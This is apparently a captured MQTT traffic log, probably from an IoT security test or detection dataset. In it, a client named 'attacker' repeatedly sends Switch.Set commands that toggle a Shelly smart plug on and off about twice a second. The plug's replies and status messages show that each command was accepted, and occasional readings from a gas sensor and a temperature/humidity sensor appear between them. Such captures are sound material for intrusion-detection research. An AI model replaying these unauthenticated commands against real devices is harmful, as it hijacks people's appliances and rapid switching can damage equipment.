2026-04-22T16:37:29,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4931 34381.943 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:29,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:29,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:29,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4932 34382.426 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:29,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:29,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34382.42,""swi"
2026-04-22T16:37:29,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4933 34382.442 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:30,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:30,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4934 34382.926 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:30,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:30,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34382.92,""swi"
2026-04-22T16:37:30,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4935 34382.945 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:30,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:30,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:30,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4936 34383.427 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:30,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:30,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34383.42,""swi"
2026-04-22T16:37:30,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4937 34383.444 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:31,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:31,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4938 34383.927 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:31,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:31,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34383.92,""swi"
2026-04-22T16:37:31,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4939 34383.946 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:31,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:31,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:31,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4940 34384.429 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:31,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:31,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34384.43,""swi"
2026-04-22T16:37:31,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4941 34384.445 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:32,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:32,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4942 34384.928 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:32,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:32,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34384.93,""swi"
2026-04-22T16:37:32,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4943 34384.947 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:32,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:32,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:32,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4944 34385.430 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:32,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:32,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34385.43,""swi"
2026-04-22T16:37:32,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4945 34385.447 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:33,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:33,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4946 34385.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:33,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:33,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34385.93,""swi"
2026-04-22T16:37:33,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4947 34385.949 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:33,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:33,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:33,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4948 34386.429 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:33,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:33,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34386.43,""swi"
2026-04-22T16:37:33,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4949 34386.445 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:34,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:34,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4950 34386.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:34,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:34,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34386.93,""swi"
2026-04-22T16:37:34,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4951 34386.948 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:34,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:34,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:34,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4952 34387.430 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:34,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:34,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34387.43,""swi"
2026-04-22T16:37:34,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4953 34387.446 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:35,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:35,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4954 34387.931 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:35,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:35,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34387.93,""swi"
2026-04-22T16:37:35,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4955 34387.950 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:35,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:35,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:35,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4956 34388.431 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:35,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:35,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34388.43,""swi"
2026-04-22T16:37:35,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4957 34388.448 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:36,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:36,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4958 34388.932 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:36,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:36,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34388.93,""swi"
2026-04-22T16:37:36,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4959 34388.951 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:36,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:36,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:36,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4960 34389.433 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:36,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:36,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34389.43,""swi"
2026-04-22T16:37:36,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4961 34389.449 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:36,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:37,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:37,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4962 34389.933 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34389.93,""swi"
2026-04-22T16:37:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4963 34389.952 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:37,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:37,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:37,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4964 34390.438 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:37,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:37,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34390.43,""swi"
2026-04-22T16:37:37,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4965 34390.454 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4966 34390.934 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34390.93,""swi"
2026-04-22T16:37:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4967 34390.952 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4968 34391.434 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34391.43,""swi"
2026-04-22T16:37:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4969 34391.450 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4970 34391.938 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34391.93,""swi"
2026-04-22T16:37:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4971 34391.956 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4972 34392.439 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34392.44,""swi"
2026-04-22T16:37:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4973 34392.456 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4974 34392.942 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34392.94,""swi"
2026-04-22T16:37:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4975 34392.961 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4976 34393.440 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34393.44,""swi"
2026-04-22T16:37:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4977 34393.457 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:41,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4978 34393.941 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:41,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:41,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34393.94,""swi"
2026-04-22T16:37:41,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4979 34393.959 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4980 34394.442 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34394.44,""swi"
2026-04-22T16:37:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4981 34394.458 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:42,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:42,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4982 34394.943 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:42,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:42,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34394.94,""swi"
